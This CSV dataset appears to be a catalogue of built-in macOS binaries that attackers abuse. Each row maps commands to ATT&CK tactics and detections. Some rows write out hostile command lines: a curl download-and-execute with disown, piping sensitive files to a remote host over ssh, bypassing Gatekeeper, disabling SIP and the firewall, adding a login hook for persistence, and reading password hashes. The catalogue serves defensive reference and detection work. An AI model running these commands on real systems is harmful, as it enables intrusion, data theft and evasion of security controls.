"name","author","short_description","full_description","created","example_use_cases","example_use_cases_name","example_use_cases_description","example_use_cases_code","example_use_cases_tactics","example_use_cases_tags","paths","detections","detections_name","detections_url","resources","resources_name","resources_url","acknowledgements","is_legit"
"dscl","Jonathan Bar Or (@yo_yo_yo_jbo)","Interact with Directory Services.","An extensive tool for communicating with the Directory Services, useful for Discovery.","2023-04-25","","[''Local user enumeration''-|-''Active Directory user enumeration''-|-''Local user information gathering''-|-''Active Directory user information gathering''-|-''Local group enumeration''-|-''Active Directory group enumeration''-|-''Local group information gathering''-|-''Active Directory group information gathering''-|-''Computer enumration''-|-''Share enumration''-|-''Password policy discovery''-|-''Change a user password''-|-''Local account creation'']","[''Enumerate all local users.''-|-''Enumerate all Active Directory users.''-|-''Gain useful local user information such as when their password was last set, their keyboard layout, their avatar, their home directory, UID and default shell.''-|-''Gain useful Active Directory user information such as when their password was last set, their keyboard layout, their avatar, their home directory, UID and default shell.''-|-''Enumerate all local groups.''-|-''Enumerate all Active Directory groups.''-|-''Gain useful local group information such as which users belong to that group, SMB SIDs and group ID. Especially useful for the ""admin"" group.''-|-''Gain useful Active Directory group information such as which users belong to that group, SMB SIDs and group ID. Especially useful for the ""admin"" group.''-|-''Enumerate all computers in an Active Directory.''-|-''Enumerate all shares.''-|-''Gain password policy information''-|-''Change an existing user's password.''-|-''Create a local account'']","[''dscl . -list /Users dscl . list /Users dscl . ls /Users ''-|-''dscl ""/Active Directory/TEST/All Domains"" -list /Users dscl ""/Active Directory/TEST/All Domains"" list /Users dscl ""/Active Directory/TEST/All Domains"" ls /Users ''-|-''dscl . -read /Users/$USERNAME dscl . read /Users/$USERNAME dscl . cat /Users/$USERNAME ''-|-''dscl ""/Active Directory/TEST/All Domains"" -read /Users/$USERNAME dscl ""/Active Directory/TEST/All Domains"" read /Users/$USERNAME dscl ""/Active Directory/TEST/All Domains"" cat /Users/$USERNAME ''-|-''dscl . -list /Groups dscl . list /Groups dscl . ls /Groups ''-|-''dscl ""/Active Directory/TEST/All Domains"" -list /Groups dscl ""/Active Directory/TEST/All Domains"" list /Groups dscl ""/Active Directory/TEST/All Domains"" ls /Groups ''-|-''dscl . -read /Groups/$GROUPNAME dscl . read /Groups/$GROUPNAME dscl . cat /Groups/$GROUPNAME ''-|-''dscl ""/Active Directory/TEST/All Domains"" -read /Groups/$GROUPNAME dscl ""/Active Directory/TEST/All Domains"" read /Groups/$GROUPNAME dscl ""/Active Directory/TEST/All Domains"" cat /Groups/$GROUPNAME ''-|-''dscl  ""/Active Directory/TEST/All Domains"" -list /Computers dscl  ""/Active Directory/TEST/All Domains"" list /Computers dscl  ""/Active Directory/TEST/All Domains"" ls /Computers ''-|-''dscl . -list /SharePoints dscl . list /SharePoints dscl . ls /SharePoints ''-|-''dscl . -read /Config/shadowhash dscl . read /Config/shadowhash dscl . cat /Config/shadowhash ''-|-''dscl . passwd /Users/$USERNAME oldPassword newPassword''-|-''dscl -create'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Persistence''-|-''Persistence'']","[''users''-|-''network''-|-''users''-|-''users''-|-''configuration''-|-''network''-|-''users''-|-''configuration''-|-''groups''-|-''network''-|-''groups''-|-''groups''-|-''configuration''-|-''network''-|-''groups''-|-''configuration''-|-''network''-|-''shares''-|-''network''-|-''shares''-|-''password''-|-''policy''-|-''password'']","/usr/bin/dscl","","Jamf Protect: Detect user account creation with dscl","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/user_created_by_dscl","","[''MacOS Red Teaming - HackTricks''-|-''MITRE ATT&CK T1136.001 Create Account: Local Account'']","[''https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-red-teaming''-|-''https://attack.mitre.org/techniques/T1136/001/'']","","false"
"dscacheutil","Ethan Nay","gather information, statistics and initiate queries to the Directory Service cache.","dscacheutil does various operations against the Directory Service cache including gathering statistics, initiating lookups, inspection, cache flush, etc. This tool replaces most of the functionality of the lookupd tool previously available in the OS.","2023-08-23","","[''Lookup  a user''-|-''Lookup all users'']","[''List the user information''-|-''List the all users information'']","[''dscacheutil -q user -a name <USER_NAME>''-|-''dscacheutil -q user'']","[''Discovery''-|-''Discovery'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/bin/dscacheutil","","No detections at time of publishing","N/A","","[''macOS/binaries/dscacheutil''-|-''dscacheutil man page'']","[''https://macosbin.com/bin/dscacheutil''-|-''https://ss64.com/osx/dscacheutil.html'']","","false"
"dns-sd","Brendan Chamberlain (@infosecB)","Discover local network services using the DNS-Based Service Discovery (SD) protocol.","dns-sd can be used to interact with the Multicast DNS (mDNS) and DNS Service Discovery (DNS-SD) protocols. The tool is useful for administrators but can also be abused by malicious actors to discover local network services.","2023-05-19","","[''Discover SSH hosts''-|-''Discover web hosts''-|-''Discover hosts serving remote screen sharing''-|-''Discover hosts serving SMB'']","[''Hosts serving SSH can be discovered using the _ssh._tcp service string.''-|-''Hosts serving web services can be discovered using the _http._tcp service string.''-|-''Hosts serving remote screen sharing can be discovered using the _rfb._tcp service string.''-|-''Hosts serving SMB can be discovered using the _smb._tcp service string.'']","[''dns-sd -B _ssh._tcp''-|-''dns-sd -B _http._tcp''-|-''dns-sd -B _rfb._tcp''-|-''dns-sd -B _smb._tcp'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''network''-|-''network''-|-''network''-|-''network'']","/usr/bin/dns-sd","","Jamf Protect: Detect dns-sd discovery activity","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/dns_service_discovery","","[''What does APT Activity Look Like on macOS?''-|-''mDNS / Bonjour Bible - List of Common Service Strings for various vendors'']","[''https://themittenmac.com/what-does-apt-activity-look-like-on-macos''-|-''https://jonathanmumm.com/tech-it/mdns-bonjour-bible-common-service-strings-for-various-vendors/'']","Chris Ross, Cedric Owens: Farming The Apple Orchards: Living Off The Land Techniques","false"
"ditto","Brendan Chamberlain (@infosecB)","Copy files and directories while preserving file attributes and permissions.","ditto is a command line utility that is commonly used to copy files and directories while preserving file attributes and permissions. The tool can be used by malicious actors to collect and exfiltrate sensitive data, move laterally, and/or perform DLL hijacking or binary replacement attacks.","2023-05-04","","[''Copy and compress sensitive data locally''-|-''Remove extended attributes from a file''-|-''Copy, compress, and transfer sensitive data to a remote macOS host''-|-''DLL hjiacking'']","[''The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.''-|-''ditto can be used to bypass Gatekeeper by removing the ""com.apple.quarantine"" extended attribute.''-|-''The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.''-|-''Replace a legitimate library with a malicious one while maintaining the original file permissions and attributes.'']","[''ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files /tmp/l00t.zip''-|-''ditto -c -k unsigned.app app.zip ditto -x -k app.zip unsigned.app 2>/dev/null''-|-''ditto -c --norsrc /home/user/sensitive-files - | ssh remote_host ditto -x --norsrc - /home/user/l00t''-|-''ditto -V /path/to/malicious-library/malicious_library.dylib /path/to/target-library/original_library.dylib'']","[''Collection''-|-''Exfiltration''-|-''Collection''-|-''Exfiltration''-|-''Collection''-|-''Exfiltration''-|-''Lateral Movement''-|-''Defense Evasion''-|-''Persistence'']","[''files''-|-''compress''-|-''recursive''-|-''files''-|-''compress''-|-''recursive''-|-''files''-|-''files'']","/usr/bin/ditto","","No detection content at time of writing","N/A","","[''ditto man page''-|-''Gatekeeper’s Achilles heel: Unearthing a macOS vulnerability''-|-''Jamf Threat Labs identifies Safari vulnerability allowing for Gatekeeper bypass'']","[''https://ss64.com/osx/ditto.html''-|-''https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/''-|-''https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/'']","","false"
"disown","Gabriel De Jesus (0xv1n)","Prevents a process from being terminated when a shell session or terminal is closed.","disown is a system utility that can be utilized to persist a shell process after a terminal has been closed or a shell session has been terminated. This is accomplished by preventing a SIGHUP from being sent to the running job, and removing the process from the shell jobs table. Unlike nohup which is used during process initialization, disown can be used to modify an existing process.","2025-05-27","","Start a process and remove it from the jobs table.","The following command downloads a remote binary, sets it to executable, executes the binary, disowns it from the shell it spawned from, and closes the terminal session.","curl -O http://1.1.1.1/updated && chmod +x updated && ./updated & disown && pkill Terminal","Persistence","bash","shell built-in command (bash)","","No detection content at time of writing","N/A","","[''disown man page''-|-''bash man page''-|-''Poseidon Stealer'']","[''https://linux.die.net/man/1/disown''-|-''https://man7.org/linux/man-pages/man1/bash.1.html''-|-''https://www.esentire.com/blog/poseidon-stealer-uses-sora-ai-lure-to-infect-macos'']","","false"
"defaults","Brendan Chamberlain (@infosecB)","Read, write, and delete user preference values.","The defaults binary is normally used to interact with the user defaults system, a database of macOS used to manage system settings much like the Windows Registry. The database can be abused by threat actors to change settings in attempt to evade defenses or to gain persistence.","2023-05-24","","[''Disable Gatekeeper's auto rearm functionality''-|-''Show mounted servers''-|-''Add a login item to the current user''-|-''Get Active Directory user info from Jamf Connect''-|-''Enable Firewall''-|-''Disable Firewall'']","[''The following command can be used to disable Gatekeepers rearm functionality. This command requires root privileges.''-|-''Show all mounted servers on the desktop.''-|-''An attacker can use defaults to add a login hook in attempt to gain persistence. This command requires root privileges.''-|-''Retrieve Active Directory user info from Jamf Connect defaults configuration.''-|-''Enables macOS' default firewall. This command requires root privileges.''-|-''Disables macOS' default firewall. This command requires root privileges.'']","[''sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO''-|-''defaults read com.apple.finder ""ShowMountedServersOnDesktop""''-|-''sudo defaults write /Library/Preferences/com.apple.loginwindow LoginHook gain_persistence.sh''-|-''defaults read com.jamf.connect.state''-|-''sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 1''-|-''sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0'']","[''Defense Evasion''-|-''Discovery''-|-''Persistence''-|-''Discovery''-|-''Defense Evasion''-|-''Defense Evasion'']","[''gatekeeper''-|-''firewall''-|-''firewall'']","/usr/bin/defaults","","No detections at time of publishing","N/A","","[''macOS defaults list: Uncomplete list of macOS defaults commands with demos''-|-''Insistence on Persistence'']","[''https://macos-defaults.com/''-|-''https://www.huntress.com/blog/insistence-on-persistence'']","","false"
"csrutil","Megan Carney (https://infosec.exchange/@PwnieFan)","Configure or view system security policies.","Used to enable/disable SIP, configure netboot and authenticated-root settings","2023-05-14","","[''Disable SIP''-|-''Disable authenticated-root''-|-''Add a netboot server''-|-''Map infrastructure''-|-''Determine if SIP is enabled'']","[''disable SIP (System Integrity Protection) - requires booting into recovery mode''-|-''When authenticated-root is disabled, booting is allowed from non-sealed system snapshots - requires booting into recovery mode''-|-''Insert a new IPv4 address in the list of allowed NetBoot sources''-|-''List allowed NetBoot sources''-|-''Determine if System Integrity Protection is enabled'']","[''csrutil disable''-|-''csrutil authenticated-root disable''-|-''csrutil netboot add <address>''-|-''csrutil netboot list''-|-''csrutil status'']","[''Defense Evasion''-|-''Defense Evasion''-|-''Defense Evasion''-|-''Reconnaissance''-|-''Discovery''-|-''Discovery'']","[''users''-|-''users''-|-''configuration''-|-''configuration'']","/usr/bin/csrutil","","[''Sigma: System Integrity Protection (SIP) Disabled''-|-''Sigma: System Integrity Protection (SIP) Enumeration'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_csrutil_disable.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_csrutil_status.yml'']","","[''Discussion on how SIP interacts with bless and netboot''-|-''MITRE ATT&CK T1518.001 Software Discovery: Security Software Discovery''-|-''The XCSSET Malware: Inserts Malicious Code Into Xcode Projects, Performs UXSSBackdoor Planting in Safari, and LeveragesTwo Zero-day Exploits'']","[''https://developer.apple.com/forums/thread/4002''-|-''https://attack.mitre.org/techniques/T1518/001/''-|-''https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf'']","","false"
"codesign","Thijs Xhaflaire","Create, manipulate and verify code signatures.","The codesign command is used to create, check, and display code signatures, as well as inquire into the dynamic status of signed code in the system.","2024-07-29","","Ad-hod codesigning an app bundle","This command forcefully re-signs the MyApp.app application with an ad-hoc signature, applying the signature deeply to all nested code within the app","codesign --force --deep -s - MyApp.app","Defense Evasion","codesign","/usr/bin/codesign","","Jamf Protect: Detect ad-hod codesigning activity","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/adhoc_codesigning","","[''When Apple Admits macOS Malware Is A Problem – It’s Time To Take Notice''-|-''codesign man page'']","[''https://www.sentinelone.com/blog/when-apple-admits-macos-malware-is-a-problem-its-time-to-take-notice/''-|-''https://ss64.com/mac/codesign.html'']","","false"
"chflags","demonduck","Changes file or directory flags","The chflags utility modifies the file flags of the listed files as  specified by the flags operand.","2024-07-25","","[''Hide a file''-|-''Remove hidden flag'']","[''Add the hidden flag to a file or directory to prevent it from being  visible in Finder and Terminal.''-|-''Remove the hidden flag to a file or directory to make it visible in Finder and Terminal.'']","[''chflags hidden ~/evil''-|-''chflags nohidden ~/evil'']","[''Defense Evasion''-|-''Defense Evasion'']","[''finder''-|-''finder'']","/usr/bin/chflags","","Sigma: Hidden Flag Set On File/Directory Via Chflags","https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_chflags_hidden_flag.yml","","[''chflags man page''-|-''macOS/binaries/chflags''-|-''How to hide files and folders'']","[''https://ss64.com/mac/chflags.html''-|-''https://macosbin.com/bin/chflags''-|-''https://eclecticlight.co/2024/07/03/how-to-hide-files-and-folders/'']","","false"
"caffeinate","Ethan Nay","Prevent the system from sleeping on behalf of a utility.","caffeinate creates assertions to alter system sleep behavior.  If no assertion flags are specified, caffeinate creates an assertion to prevent idle sleep. If a utility is specified, caffeinate creates the assertions on the utility's behalf, and those assertions will persist for the duration of the utility's execution. Otherwise, caffeinate creates the assertions directly, and those assertions will persist until caffeinate exits.","2023-07-12","","[''Fork a process''-|-''Prevent a sleep'']","[''Make caffeinate fork a process and hold an assertion that prevents idle sleep as long as that process is running''-|-''Prevent a macOS from going to sleep for 4 hours (14400 seconds)'']","[''caffeinate -i /tmp/evil''-|-''caffeinate -u -t 14400'']","[''Execution''-|-''Defense Evasion''-|-''Execution'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/bin/caffeinate","","No detections at time of publishing","N/A","","[''macOS/binaries/caffeinate''-|-''caffeinate man page'']","[''https://macosbin.com/bin/caffeinate''-|-''https://ss64.com/osx/caffeinate.html'']","","false"
"SetFile","Chris Campbell (@texasbe2trill)","Set attributes of files and directories.","Uses the CommandLine/Terminal to set file and or directory attributes. It can set attributes, creator, creation date, modification date, and file type for multiple files at a time.","2023-04-23","","[''Set a file or directory attribute to invisible''-|-''Change a file's creation and modification timestamps'']","[''A bash or zsh oneliner can allow an attacker to set the file attribute to invisible. This action can establish persistence and evade detection for malicious files on the system.''-|-''Setfile can be used with the -d and -m arguments to alter a file's creation and modification date, respectively.'']","[''for FILE in ~/*; do echo $(SetFile -a V $FILE && echo $(GetFileInfo $FILE)) >> /tmp/fileinfo.txt; sleep 2; done''-|-''SetFile -d ""04/25/2023 11:11:00"" -m ""04/25/2023 11:12:00"" targetfile.txt'']","[''Persistence''-|-''Defense Evasion''-|-''Defense Evasion'']","[''bash''-|-''zsh''-|-''oneliner''-|-''bash''-|-''zsh''-|-''oneliner'']","/usr/bin/SetFile","","No detections at time of publishing","N/A","","The Invisible Bit","https://daringfireball.net/2008/04/the_invisible_bit","","false"
"GetFileInfo","Chris Campbell (@texasbe2trill)","Get attributes of files and directories.","Uses the CommandLine/Terminal to return type, creator, attributes, created, and modified file information of a file or directory.","2023-04-23","","Iterate through a directory to GetFileInfo","A bash or zsh oneliner can provide an attacker with information about specific files of interest.","for FILE in ~/Downloads/*; do echo $(GetFileInfo $FILE) >> fileinfo.txt; sleep 2; done","Discovery","[''bash''-|-''zsh''-|-''oneliner'']","/usr/bin/GetFileInfo","","No detections at time of publishing","N/A","","macOS/binaries/GetFileInfo","https://macosbin.com/bin/getfileinfo","","false"
